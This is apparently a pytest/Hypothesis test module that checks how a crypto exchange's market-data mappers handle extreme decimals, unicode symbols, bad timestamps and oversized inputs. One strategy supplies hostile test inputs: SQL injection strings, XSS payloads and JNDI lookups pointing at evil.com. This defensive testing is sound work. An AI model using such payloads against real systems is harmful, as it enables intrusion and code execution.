"""Property-based tests for Backpack Market Data Mapper Robustness.

This module provides comprehensive property-based testing of the Backpack market data mappers,
focusing on robustness, boundary conditions, and edge case handling critical for secure
trading operations.

SECURITY CRITICAL: Market data mapping must handle extreme conditions to prevent:
- Price manipulation through malformed decimal values
- Memory exhaustion attacks via oversized order books
- Unicode injection attacks through symbol fields
- Precision loss causing incorrect trading calculations
- Timestamp manipulation leading to stale data usage
- System crashes from boundary value exploits

Key Testing Areas:
- Boundary value handling for extreme financial amounts
- Unicode and encoding safety for international symbols
- Error handling and recovery from malformed data
- Performance and memory considerations for large datasets
- Data consistency validation across transformations
- Concurrent transformation safety

Following TESTING_SECURITY_RULES.md:
- NO hardcoded boundary values (Hypothesis generates them)
- NO fallback mechanisms that could hide validation failures
- Comprehensive testing of extreme condition boundaries
- Validation of security-sensitive data processing

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for market data model design
- Implements RULE-RUNTIME-SAFETY-V4 for safe data processing
- Adheres to RULE-NO-SILENCING-V4 for proper error propagation
"""

from __future__ import annotations

import string
from datetime import datetime, timedelta
from decimal import Decimal
from typing import Any
from unittest.mock import patch

import pytest
from hypothesis import given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.backpack.mappers.market_data.bp_order_book_mapper import (
    BackpackOrderBookMapper,
)
from cyberdelta.apis.backpack.mappers.market_data.bp_ticker_mapper import BackpackTickerMapper
from cyberdelta.apis.backpack.mappers.market_data.bp_trade_mapper import BackpackFillMapper
from cyberdelta.apis.backpack.models.bp_raw_market import (
    BackpackRawOrderBook,
    BackpackRawTickerResponse,
)
from cyberdelta.apis.backpack.models.bp_raw_trade import BackpackRawPublicTrade
from cyberdelta.apis.common import TransformationError
from cyberdelta.models import Ticker
from cyberdelta.symbols import exchanges
from tests.common_symbols import SOL_USDC_BP


# =============================================================================
# HELPER FUNCTIONS FOR HYPOTHESIS STRATEGY BUILDING
# =============================================================================


def _create_max_precision_decimal(digits: int) -> str:
    """Create maximum precision decimal string.

    Args:
        digits: Number of decimal digits.

    Returns:
        Formatted maximum precision decimal string.
    """
    return f"123.{'1' * digits}"


def _create_large_value(exp: int) -> str:
    """Create large value string.

    Args:
        exp: Exponent for the number of 9s.

    Returns:
        Formatted large value string.
    """
    return f"9{'9' * exp}.999999"


def _create_small_value(exp: int) -> str:
    """Create small value string.

    Args:
        exp: Exponent for the number of zeros.

    Returns:
        Formatted small value string.
    """
    return f"0.{'0' * exp}1"


def _create_chinese_symbol(base: str) -> str:
    """Create symbol with Chinese characters.

    Args:
        base: Base currency.

    Returns:
        Formatted symbol with Chinese characters.
    """
    return f"{base}-测试"


def _create_cyrillic_symbol(base: str) -> str:
    """Create symbol with Cyrillic characters.

    Args:
        base: Base currency.

    Returns:
        Formatted symbol with Cyrillic characters.
    """
    return f"{base}-тест"


def _create_emoji_symbol(base: str, emoji: str) -> str:
    """Create symbol with emoji.

    Args:
        base: Base currency.
        emoji: Emoji character.

    Returns:
        Formatted symbol with emoji.
    """
    return f"{base}-{emoji}"


def _create_special_char_symbol(base: str, special: str) -> str:
    """Create symbol with special characters.

    Args:
        base: Base currency.
        special: Special character.

    Returns:
        Formatted symbol with special characters.
    """
    return f"{base}{special}USDC"


def _create_mixed_content(ascii_part: str, unicode_part: str) -> str:
    """Create mixed ASCII/Unicode content.

    Args:
        ascii_part: ASCII part of the string.
        unicode_part: Unicode part of the string.

    Returns:
        Formatted mixed content string.
    """
    return f"{ascii_part}_{unicode_part}"


def _is_not_valid_timestamp(x: str) -> bool:
    """Check if string is not a valid timestamp.

    Args:
        x: String to check.

    Returns:
        True if string is not a valid timestamp.
    """
    return not (x.endswith("Z") and "T" in x and len(x.split("-")) >= 3)


def _create_iso_timestamp(
    year: int, month: int, day: int, hour: int, minute: int, second: int
) -> str:
    """Create ISO timestamp string.

    Args:
        year: Year value.
        month: Month value.
        day: Day value.
        hour: Hour value.
        minute: Minute value.
        second: Second value.

    Returns:
        Formatted ISO timestamp string.
    """
    return f"{year:04d}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}Z"


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ROBUSTNESS TESTING
# =============================================================================


def extreme_decimal_strategy() -> SearchStrategy[str]:
    """Generate extreme decimal values for boundary testing.

    Returns:
        A Hypothesis strategy for extreme decimal values.
    """
    return st.one_of([
        # Maximum precision
        st.builds(
            _create_max_precision_decimal,
            st.integers(min_value=1, max_value=28),  # Python Decimal max precision
        ),
        # Very large values
        st.builds(
            _create_large_value,
            st.integers(min_value=1, max_value=15),
        ),
        # Very small values
        st.builds(
            _create_small_value,
            st.integers(min_value=1, max_value=25),
        ),
        # Scientific notation extremes
        st.sampled_from([
            "1.23E+308",  # Near float max
            "1.23E-323",  # Near float min
            "9.999999999999999999999999999E+20",
            "1.000000000000000000000000001E-20",
        ]),
        # Boundary values
        st.sampled_from([
            "0",
            "0.0",
            "0.00000000000000000000000000001",
            "999999999999999999.999999999999999999",
            "123456789012345678901234567890",
        ]),
    ])


def unicode_symbol_strategy() -> SearchStrategy[str]:
    """Generate unicode symbol strings for internationalization testing.

    Returns:
        A Hypothesis strategy for unicode symbols.
    """
    return st.one_of([
        # Standard ASCII symbols
        st.text(
            min_size=3,
            max_size=30,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_./"
            ),
        ),
        # Chinese characters
        st.builds(
            _create_chinese_symbol,
            st.sampled_from(["BTC", "ETH", "SOL", "DOGE"]),
        ),
        # Cyrillic characters
        st.builds(
            _create_cyrillic_symbol,
            st.sampled_from(["BTC", "ETH", "SOL", "DOGE"]),
        ),
        # Emoji symbols
        st.builds(
            _create_emoji_symbol,
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["🚀", "💎", "📈", "💰", "⚡", "🌙"]),
        ),
        # Mixed unicode and ASCII
        st.lists(
            st.one_of([
                st.text(min_size=1, max_size=8, alphabet=string.ascii_uppercase),
                st.sampled_from(["测试", "тест", "🚀", "αβγ", "العربية"]),
            ]),
            min_size=2,
            max_size=4,
        ).map("-".join),
        # Special trading characters
        st.builds(
            _create_special_char_symbol,
            st.sampled_from(["BTC", "ETH", "SOL"]),
            st.sampled_from(["/", "_", ".", "@", "#"]),
        ),
    ])


def large_order_book_levels_strategy() -> SearchStrategy[list[tuple[str, str]]]:
    """Generate large order book levels for performance testing.

    Returns:
        A Hypothesis strategy for order book levels.
    """
    return st.one_of([
        # Empty levels
        st.just([]),
        # Small levels
        st.lists(
            st.tuples(extreme_decimal_strategy(), extreme_decimal_strategy()),
            min_size=1,
            max_size=10,
        ),
        # Large levels for stress testing
        st.lists(
            st.tuples(
                st.builds(
                    str,
                    st.decimals(min_value=Decimal("0.001"), max_value=Decimal(100000), places=6),
                ),
                st.builds(
                    str,
                    st.decimals(min_value=Decimal("0.1"), max_value=Decimal(1000000), places=4),
                ),
            ),
            min_size=100,
            max_size=1000,  # Reduced from original to avoid memory issues
        ),
    ])


def malformed_decimal_strategy() -> SearchStrategy[str]:
    """Generate malformed decimal strings for error testing.

    Returns:
        A Hypothesis strategy for malformed decimals.
    """
    return st.one_of([
        # Invalid formats
        st.sampled_from([
            "not_a_number",
            "NaN",
            "inf",
            "-inf",
            "infinity",
            "1.2.3",
            "1..2",
            "..",
            "1.",
            ".1.",
            "123.abc",
            "",
            " ",
            "   ",
            "\t",
            "\n",
            "\r\n",
        ]),
        # Unicode digits that might cause issues
        st.sampled_from([
            "123.456",  # ASCII digits replacing full-width
            "۱۲۳.۴۵۶",  # Arabic-Indic digits
            "༡༢༣.༤༥༦",  # Tibetan digits
        ]),
        # Edge cases
        st.sampled_from([
            "0x123",
            "0b101",
            "0o777",  # Different number bases
            "1e",
            "1e+",
            "1e-",
            "e10",  # Incomplete scientific notation
            "+",
            "-",
            "+-123",
            "-+123",  # Invalid signs
        ]),
    ])


def iso_timestamp_strategy() -> SearchStrategy[str]:
    """Generate ISO timestamp strings including edge cases.

    Returns:
        A Hypothesis strategy for ISO timestamps.
    """
    return st.one_of([
        # Valid ISO formats
        st.builds(
            _create_iso_timestamp,
            st.integers(min_value=1970, max_value=2100),
            st.integers(min_value=1, max_value=12),
            st.integers(min_value=1, max_value=28),
            st.integers(min_value=0, max_value=23),
            st.integers(min_value=0, max_value=59),
            st.integers(min_value=0, max_value=59),
        ),
        # Edge case timestamps
        st.sampled_from([
            "1970-01-01T00:00:00Z",  # Unix epoch
            "2038-01-19T03:14:07Z",  # 32-bit timestamp limit
            "2100-12-31T23:59:59Z",  # Far future
            "2024-02-29T12:00:00Z",  # Leap year
            "2024-12-31T23:59:59.999Z",  # With milliseconds
        ]),
        # Invalid formats for error testing
        st.sampled_from([
            "not_a_timestamp",
            "2024-13-40T25:70:70Z",  # Invalid values
            "2024/01/15 10:30:00",  # Wrong format
            "2024-01-15 10:30:00",  # Missing T
            "2024-01-15T10:30:00",  # Missing Z
        ]),
    ])


@composite
def ticker_data_strategy(draw: st.DrawFn) -> BackpackRawTickerResponse:
    """Generate BackpackRawTickerResponse instances with extreme values.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawTickerResponse instance with generated data.
    """
    return BackpackRawTickerResponse(
        symbol=draw(unicode_symbol_strategy()),
        firstPrice=draw(extreme_decimal_strategy()),
        lastPrice=draw(extreme_decimal_strategy()),
        high=draw(extreme_decimal_strategy()),
        low=draw(extreme_decimal_strategy()),
        priceChange=draw(extreme_decimal_strategy()),
        priceChangePercent=draw(extreme_decimal_strategy()),
        volume=draw(extreme_decimal_strategy()),
        quoteVolume=draw(extreme_decimal_strategy()),
        trades=draw(st.builds(str, st.integers(min_value=0, max_value=999999999))),
    )


@composite
def order_book_data_strategy(draw: st.DrawFn) -> BackpackRawOrderBook:
    """Generate BackpackRawOrderBook instances with extreme data.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawOrderBook instance with generated data.
    """
    return BackpackRawOrderBook(
        bids=draw(large_order_book_levels_strategy()),
        asks=draw(large_order_book_levels_strategy()),
        lastUpdateId=draw(st.builds(str, st.integers(min_value=1, max_value=999999999999))),
        timestamp=draw(iso_timestamp_strategy()),
    )


@composite
def trade_data_strategy(draw: st.DrawFn) -> BackpackRawPublicTrade:
    """Generate BackpackRawPublicTrade instances with extreme data.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawPublicTrade instance with generated data.
    """
    return BackpackRawPublicTrade(
        id=draw(
            st.text(
                min_size=1, max_size=64, alphabet=st.characters(min_codepoint=1, max_codepoint=1000)
            )
        ),
        symbol=draw(unicode_symbol_strategy()),
        price=draw(extreme_decimal_strategy()),
        qty=draw(extreme_decimal_strategy()),
        time=draw(iso_timestamp_strategy()),
        orderId=draw(st.text(min_size=1, max_size=64)),
    )


def malicious_data_strategy() -> SearchStrategy[dict[str, Any]]:
    """Generate malicious data inputs for security testing.

    Returns:
        A Hypothesis strategy for malicious inputs.
    """
    return st.one_of([
        # SQL injection attempts
        st.just({
            "symbol": "'; DROP TABLE markets;--",
            "price": "1'; DELETE FROM prices WHERE 1=1;--",
            "quantity": "1' OR '1'='1",
        }),
        # XSS attempts
        st.just({
            "symbol": "<script>alert('xss')</script>",
            "trade_id": "<img src=x onerror=alert(1)>",
            "timestamp": "javascript:alert('timestamp')",
        }),
        # Buffer overflow attempts (reasonable size to avoid memory issues)
        st.just({
            "symbol": "A" * 1000,
            "price": "9" * 1000,
            "trade_id": "1" * 1000,
        }),
        # Unicode attacks
        st.just({
            "symbol": "\udce2\udc28\udc00",  # Lone surrogates
            "price": "\x00\x01\x02",  # Control characters
            "trade_id": "\u202e\u202d",  # Right-to-left override
        }),
        # Format string attacks
        st.just({
            "symbol": "%s%s%s%s%s",
            "price": "${jndi:ldap://evil.com/a}",
            "trade_id": "%{jndi:ldap://evil.com/a}",
        }),
    ])


# =============================================================================
# PROPERTY TESTS FOR BOUNDARY VALUE HANDLING
# =============================================================================


class TestBoundaryValueHandlingProperties:
    """Property-based tests for boundary value scenarios."""

    @given(ticker_data=ticker_data_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_extreme_decimal_precision_handling(
        self, ticker_data: BackpackRawTickerResponse
    ) -> None:
        """Property: Extreme decimal values should be handled safely."""
        mapper = BackpackTickerMapper()

        try:
            result = mapper.transform_raw_ticker_to_internal(ticker_data)

            # Property: All decimal fields should be valid Decimal objects
            assert isinstance(result.price, Decimal)
            assert isinstance(result.volume, Decimal)

            # Property: Symbol should be preserved and transformed
            assert result.symbol == exchanges.backpack(ticker_data.symbol)

            # Property: Timestamp should be valid datetime
            assert isinstance(result.timestamp, datetime)

        except (TransformationError, ValueError, TypeError):
            # Expected for truly invalid inputs
            pass

    @given(
        bids=large_order_book_levels_strategy(),
        asks=large_order_book_levels_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_large_order_book_memory_handling(
        self, bids: list[tuple[str, str]], asks: list[tuple[str, str]]
    ) -> None:
        """Property: Large order books should be processed without memory issues."""
        mapper = BackpackOrderBookMapper()

        # Limit size to prevent actual memory issues in testing
        if len(bids) > 500:
            bids = bids[:500]
        if len(asks) > 500:
            asks = asks[:500]

        raw_book = BackpackRawOrderBook(
            bids=bids,
            asks=asks,
            lastUpdateId="12345",
            timestamp="2024-01-15T10:30:00Z",
        )

        try:
            result = mapper.transform_raw_order_book_to_internal(SOL_USDC_BP, raw_book)

            # Property: Output length should match input length
            assert len(result.bids) == len(bids)
            assert len(result.asks) == len(asks)

            # Property: Symbol should be preserved
            assert result.symbol == SOL_USDC_BP

            # Property: All levels should be valid tuples of Decimals
            for bid in result.bids:
                assert isinstance(bid, tuple)
                assert len(bid) == 2
                assert isinstance(bid[0], Decimal)
                assert isinstance(bid[1], Decimal)

            for ask in result.asks:
                assert isinstance(ask, tuple)
                assert len(ask) == 2
                assert isinstance(ask[0], Decimal)
                assert isinstance(ask[1], Decimal)

        except (TransformationError, ValueError, TypeError):
            # Expected for invalid decimal values
            pass

    @given(
        precision_digits=st.integers(min_value=1, max_value=28),
        base_value=st.integers(min_value=1, max_value=999999),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_decimal_precision_consistency(self, precision_digits: int, base_value: int) -> None:
        """Property: Decimal precision should be consistently maintained."""
        mapper = BackpackTickerMapper()

        # Generate high precision value
        precision_str = f"{base_value}.{'1' * precision_digits}"

        ticker_data = BackpackRawTickerResponse(
            symbol="TEST_USDC",
            firstPrice=precision_str,
            lastPrice=precision_str,
            high=precision_str,
            low=precision_str,
            priceChange="0.0",
            priceChangePercent="0.0",
            volume=precision_str,
            quoteVolume=precision_str,
            trades="100",
        )

        result = mapper.transform_raw_ticker_to_internal(ticker_data)

        # Property: Precision should be preserved exactly
        expected_decimal = Decimal(precision_str)
        assert result.price == expected_decimal
        assert result.volume == expected_decimal


# =============================================================================
# PROPERTY TESTS FOR UNICODE AND ENCODING SUPPORT
# =============================================================================


class TestUnicodeEncodingSupportProperties:
    """Property-based tests for unicode and encoding edge cases."""

    @given(unicode_symbol=unicode_symbol_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_unicode_symbol_safety(self, unicode_symbol: str) -> None:
        """Property: Unicode symbols should be handled safely."""
        mapper = BackpackTickerMapper()

        ticker_data = BackpackRawTickerResponse(
            symbol=unicode_symbol,
            firstPrice="100.0",
            lastPrice="100.0",
            high="101.0",
            low="99.0",
            priceChange="0.0",
            priceChangePercent="0.0",
            volume="1000.0",
            quoteVolume="100000.0",
            trades="500",
        )

        try:
            result = mapper.transform_raw_ticker_to_internal(ticker_data)

            # Property: Unicode should be preserved in symbol transformation
            assert result.symbol == exchanges.backpack(unicode_symbol)

            # Property: Should not leak sensitive information
            assert "password" not in str(result).lower()
            assert "secret" not in str(result).lower()
            assert "key" not in str(result).lower()

        except (TransformationError, ValueError, UnicodeError):
            # Expected for invalid unicode sequences
            pass

    @given(
        trade_id=st.text(
            min_size=1, max_size=64, alphabet=st.characters(min_codepoint=1, max_codepoint=1000)
        ),
        symbol=unicode_symbol_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_unicode_trade_id_handling(self, trade_id: str, symbol: str) -> None:
        """Property: Unicode trade IDs should be handled appropriately."""
        mapper = BackpackFillMapper()

        trade_data = BackpackRawPublicTrade(
            id=trade_id,
            symbol=symbol,
            price="100.0",
            qty="10.0",
            time="2024-01-15T10:30:00Z",
            orderId="order123",
        )

        try:
            result = mapper.transform_raw_fill_to_internal(trade_data)

            # Property: Trade ID should be preserved exactly
            assert result.id == trade_id

            # Property: Symbol should be transformed correctly
            assert result.symbol == exchanges.backpack(symbol)

        except (TransformationError, ValueError, UnicodeError):
            # Expected for problematic unicode
            pass

    @given(
        mixed_content=st.builds(
            _create_mixed_content,
            st.text(min_size=1, max_size=10, alphabet=string.ascii_uppercase),
            st.sampled_from(["测试", "тест", "🚀", "αβγ", "العربية"]),
        ),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_mixed_unicode_ascii_consistency(self, mixed_content: str) -> None:
        """Property: Mixed unicode and ASCII should be handled consistently."""
        mapper = BackpackTickerMapper()

        ticker_data = BackpackRawTickerResponse(
            symbol=mixed_content,
            firstPrice="100.0",
            lastPrice="100.0",
            high="100.0",
            low="100.0",
            priceChange="0.0",
            priceChangePercent="0.0",
            volume="1000.0",
            quoteVolume="100000.0",
            trades="100",
        )

        try:
            result = mapper.transform_raw_ticker_to_internal(ticker_data)

            # Property: Mixed content should be preserved
            assert result.symbol == exchanges.backpack(mixed_content)

            # Property: String representation should not crash
            str_repr = str(result)
            assert isinstance(str_repr, str)

        except (TransformationError, ValueError, UnicodeError):
            # Expected for problematic unicode combinations
            pass


# =============================================================================
# PROPERTY TESTS FOR ERROR HANDLING AND RECOVERY
# =============================================================================


class TestErrorHandlingRecoveryProperties:
    """Property-based tests for error handling and recovery scenarios."""

    @given(malformed_price=malformed_decimal_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malformed_decimal_error_handling(self, malformed_price: str) -> None:
        """Property: Malformed decimal values should cause appropriate errors."""
        mapper = BackpackTickerMapper()

        ticker_data = BackpackRawTickerResponse(
            symbol="TEST_USDC",
            firstPrice="100.0",
            lastPrice=malformed_price,
            high="101.0",
            low="99.0",
            priceChange="0.0",
            priceChangePercent="0.0",
            volume="1000.0",
            quoteVolume="100000.0",
            trades="100",
        )

        with pytest.raises(TransformationError):
            mapper.transform_raw_ticker_to_internal(ticker_data)

    @given(invalid_timestamp=st.text(min_size=1, max_size=50).filter(_is_not_valid_timestamp))
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_invalid_timestamp_error_handling(self, invalid_timestamp: str) -> None:
        """Property: Invalid timestamps should be handled appropriately."""
        mapper = BackpackFillMapper()

        trade_data = BackpackRawPublicTrade(
            id="test_trade",
            symbol="TEST_USDC",
            price="100.0",
            qty="10.0",
            time=invalid_timestamp,
            orderId="order123",
        )

        # Should either handle gracefully or raise appropriate error
        try:
            result = mapper.transform_raw_fill_to_internal(trade_data)
            # If successful, should have valid datetime
            assert isinstance(result.executed_at, datetime)
        except TransformationError:
            # Expected for invalid timestamps
            pass

    @given(ticker_data=ticker_data_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_transformation_error_context_preservation(
        self, ticker_data: BackpackRawTickerResponse
    ) -> None:
        """Property: Transformation errors should preserve context information."""
        mapper = BackpackTickerMapper()

        # Mock parse_decimal_safely to force an error
        with patch.object(mapper, "parse_decimal_safely") as mock_parse:
            original_error = ValueError("Specific parsing error with context")
            mock_parse.side_effect = original_error

            with pytest.raises(TransformationError) as exc_info:
                mapper.transform_raw_ticker_to_internal(ticker_data)

            # Property: Error context should be preserved
            assert "Failed to transform BackpackRawTickerResponse to Ticker" in str(exc_info.value)
            assert exc_info.value.__cause__ == original_error


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestSecurityBoundariesProperties:
    """Property-based tests for security-critical boundary handling."""

    @given(malicious_data=malicious_data_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malicious_input_resistance(self, malicious_data: dict[str, Any]) -> None:
        """Property: Mappers should resist malicious input attacks."""
        ticker_mapper = BackpackTickerMapper()
        trade_mapper = BackpackFillMapper()

        # Test ticker mapper with malicious data
        try:
            ticker_data = BackpackRawTickerResponse(
                symbol=malicious_data.get("symbol", "TEST_USDC"),
                firstPrice="100.0",
                lastPrice=malicious_data.get("price", "100.0"),
                high="101.0",
                low="99.0",
                priceChange="0.0",
                priceChangePercent="0.0",
                volume="1000.0",
                quoteVolume="100000.0",
                trades="100",
            )

            ticker_result = ticker_mapper.transform_raw_ticker_to_internal(ticker_data)

            # Property: Should not execute malicious content
            assert isinstance(ticker_result.price, Decimal)
            assert hasattr(ticker_result.symbol, "value")  # Symbol should have a value attribute

        except (TransformationError, ValueError, TypeError):
            # Expected for malicious/invalid inputs
            pass

        # Test trade mapper with malicious data
        try:
            trade_data = BackpackRawPublicTrade(
                id=malicious_data.get("trade_id", "test_trade"),
                symbol=malicious_data.get("symbol", "TEST_USDC"),
                price=malicious_data.get("price", "100.0"),
                qty="10.0",
                time="2024-01-15T10:30:00Z",
                orderId="order123",
            )

            trade_result = trade_mapper.transform_raw_fill_to_internal(trade_data)

            # Property: Should not leak sensitive information
            assert "password" not in str(trade_result).lower()
            assert "secret" not in str(trade_result).lower()
            assert "key" not in str(trade_result).lower()

        except (TransformationError, ValueError, TypeError):
            # Expected for malicious/invalid inputs
            pass

    @given(
        large_string=st.text(min_size=500, max_size=2000),  # Reasonable size to avoid memory issues
        field_name=st.sampled_from(["symbol", "trade_id"]),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_large_input_handling(self, large_string: str, field_name: str) -> None:
        """Property: Large inputs should be handled without system issues."""
        ticker_mapper = BackpackTickerMapper()
        trade_mapper = BackpackFillMapper()

        if field_name == "symbol":
            try:
                ticker_data = BackpackRawTickerResponse(
                    symbol=large_string,
                    firstPrice="100.0",
                    lastPrice="100.0",
                    high="101.0",
                    low="99.0",
                    priceChange="0.0",
                    priceChangePercent="0.0",
                    volume="1000.0",
                    quoteVolume="100000.0",
                    trades="100",
                )

                ticker_result = ticker_mapper.transform_raw_ticker_to_internal(ticker_data)

                # Property: Output should be reasonable size
                assert len(str(ticker_result)) <= len(large_string) + 10000

            except (TransformationError, ValueError, TypeError):
                # Expected for oversized inputs
                pass

        elif field_name == "trade_id":
            try:
                trade_data = BackpackRawPublicTrade(
                    id=large_string,
                    symbol="TEST_USDC",
                    price="100.0",
                    qty="10.0",
                    time="2024-01-15T10:30:00Z",
                    orderId="order123",
                )

                trade_result = trade_mapper.transform_raw_fill_to_internal(trade_data)

                # Property: Should handle large IDs appropriately
                assert isinstance(trade_result.id, str)

            except (TransformationError, ValueError, TypeError):
                # Expected for oversized inputs
                pass


# =============================================================================
# PROPERTY TESTS FOR PERFORMANCE AND MEMORY
# =============================================================================


class TestPerformanceMemoryProperties:
    """Property-based tests for performance and memory efficiency."""

    @given(
        ticker_count=st.integers(min_value=1, max_value=100),
        base_price=st.decimals(min_value=Decimal(1), max_value=Decimal(100000), places=2),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_batch_transformation_efficiency(self, ticker_count: int, base_price: Decimal) -> None:
        """Property: Batch transformations should be memory efficient."""
        mapper = BackpackTickerMapper()

        # Generate multiple tickers
        tickers: list[BackpackRawTickerResponse] = []
        for i in range(ticker_count):
            ticker = BackpackRawTickerResponse(
                symbol=f"SYMBOL{i:03d}_USDC",
                firstPrice=str(base_price),
                lastPrice=str(base_price + Decimal(i) * Decimal("0.01")),
                high=str(base_price + Decimal("1.0")),
                low=str(base_price - Decimal("1.0")),
                priceChange="0.0",
                priceChangePercent="0.0",
                volume="1000.0",
                quoteVolume="100000.0",
                trades="100",
            )
            tickers.append(ticker)

        # Transform all tickers
        results: list[Ticker] = []
        for ticker in tickers:
            result = mapper.transform_raw_ticker_to_internal(ticker)
            results.append(result)

        # Property: All transformations should be consistent
        assert len(results) == ticker_count
        for i, result in enumerate(results):
            expected_symbol = exchanges.backpack(f"SYMBOL{i:03d}_USDC")
            assert result.symbol == expected_symbol
            expected_price = base_price + Decimal(i) * Decimal("0.01")
            assert result.price == expected_price

    @given(
        level_count=st.integers(min_value=1, max_value=200),  # Reduced to prevent memory issues
        base_price=st.decimals(min_value=Decimal(50), max_value=Decimal(150), places=2),
    )
    @settings(max_examples=30, deadline=timedelta(seconds=1))
    def test_order_book_memory_efficiency(self, level_count: int, base_price: Decimal) -> None:
        """Property: Order book processing should be memory efficient."""
        mapper = BackpackOrderBookMapper()

        # Generate order book levels
        bids = [
            (str(base_price - Decimal(i) * Decimal("0.01")), str(Decimal(i + 1)))
            for i in range(level_count)
        ]
        asks = [
            (str(base_price + Decimal(i) * Decimal("0.01")), str(Decimal(i + 1)))
            for i in range(level_count)
        ]

        raw_book = BackpackRawOrderBook(
            bids=bids,
            asks=asks,
            lastUpdateId="12345",
            timestamp="2024-01-15T10:30:00Z",
        )

        result = mapper.transform_raw_order_book_to_internal(SOL_USDC_BP, raw_book)

        # Property: Output should match input structure
        assert len(result.bids) == level_count
        assert len(result.asks) == level_count

        # Property: Precision should be maintained
        assert result.bids[0][0] == base_price
        assert result.asks[0][0] == base_price


# =============================================================================
# PROPERTY TESTS FOR DATA CONSISTENCY
# =============================================================================


class TestDataConsistencyValidationProperties:
    """Property-based tests for data consistency and validation."""

    @given(
        bid_price=st.decimals(min_value=Decimal(90), max_value=Decimal(110), places=2),
        ask_price=st.decimals(min_value=Decimal(90), max_value=Decimal(110), places=2),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_order_book_price_relationship_handling(
        self, bid_price: Decimal, ask_price: Decimal
    ) -> None:
        """Property: Order books should handle various price relationships."""
        mapper = BackpackOrderBookMapper()

        bids = [(str(bid_price), "10.0")]
        asks = [(str(ask_price), "8.0")]

        raw_book = BackpackRawOrderBook(
            bids=bids,
            asks=asks,
            lastUpdateId="12345",
            timestamp="2024-01-15T10:30:00Z",
        )

        result = mapper.transform_raw_order_book_to_internal(SOL_USDC_BP, raw_book)

        # Property: Raw data should be preserved regardless of market validity
        assert result.bids[0][0] == bid_price
        assert result.asks[0][0] == ask_price

        # Property: Symbol should be consistent
        assert result.symbol == SOL_USDC_BP

    @given(
        precision_value=st.decimals(min_value=Decimal(1), max_value=Decimal(1000), places=15),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_decimal_precision_consistency_across_fields(self, precision_value: Decimal) -> None:
        """Property: Decimal precision should be consistent across all fields."""
        mapper = BackpackTickerMapper()

        precision_str = str(precision_value)

        ticker_data = BackpackRawTickerResponse(
            symbol="TEST_USDC",
            firstPrice=precision_str,
            lastPrice=precision_str,
            high=precision_str,
            low=precision_str,
            priceChange="0.0",
            priceChangePercent="0.0",
            volume=precision_str,
            quoteVolume=precision_str,
            trades="100",
        )

        result = mapper.transform_raw_ticker_to_internal(ticker_data)

        # Property: All decimal fields should maintain same precision
        assert result.price == precision_value
        assert result.volume == precision_value


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_decimal_precision_boundaries_regression() -> None:
    """Test handling of extreme decimal precision values for regression."""
    mapper = BackpackTickerMapper()

    max_precision_price = "100.123456789012345678901234567890"
    ticker_data = BackpackRawTickerResponse(
        symbol="SOL_USDC",
        firstPrice="100.0",
        lastPrice=max_precision_price,
        high="101.0",
        low="99.0",
        priceChange="0.0",
        priceChangePercent="0.0",
        volume="1000.0",
        quoteVolume="100000.0",
        trades="100",
    )

    result = mapper.transform_raw_ticker_to_internal(ticker_data)
    assert result.price == Decimal(max_precision_price)


def test_large_order_book_handling_regression() -> None:
    """Test handling of large order books for regression."""
    mapper = BackpackOrderBookMapper()

    # Create 100 bid and ask levels
    bids = [(f"{100 - i * 0.001:.3f}", f"{i + 1}.0") for i in range(100)]
    asks = [(f"{101 + i * 0.001:.3f}", f"{i + 1}.0") for i in range(100)]

    raw_book = BackpackRawOrderBook(
        bids=bids,
        asks=asks,
        lastUpdateId="12345",
        timestamp="2024-01-15T10:30:00Z",
    )

    result = mapper.transform_raw_order_book_to_internal(SOL_USDC_BP, raw_book)

    assert len(result.bids) == 100
    assert len(result.asks) == 100
    assert result.bids[0] == (Decimal("100.000"), Decimal("1.0"))


def test_unicode_symbol_support_regression() -> None:
    """Test unicode symbol support for regression."""
    mapper = BackpackTickerMapper()

    unicode_symbol = "SOL-USDC-测试"
    ticker_data = BackpackRawTickerResponse(
        symbol=unicode_symbol,
        firstPrice="100.0",
        lastPrice="100.0",
        high="101.0",
        low="99.0",
        priceChange="0.0",
        priceChangePercent="0.0",
        volume="1000.0",
        quoteVolume="100000.0",
        trades="100",
    )

    result = mapper.transform_raw_ticker_to_internal(ticker_data)
    assert result.symbol == exchanges.backpack(unicode_symbol)


def test_malformed_decimal_error_handling_regression() -> None:
    """Test malformed decimal error handling for regression."""
    mapper = BackpackTickerMapper()

    ticker_data = BackpackRawTickerResponse(
        symbol="TEST_USDC",
        firstPrice="100.0",
        lastPrice="not_a_number",
        high="101.0",
        low="99.0",
        priceChange="0.0",
        priceChangePercent="0.0",
        volume="1000.0",
        quoteVolume="100000.0",
        trades="100",
    )

    with pytest.raises(TransformationError):
        mapper.transform_raw_ticker_to_internal(ticker_data)
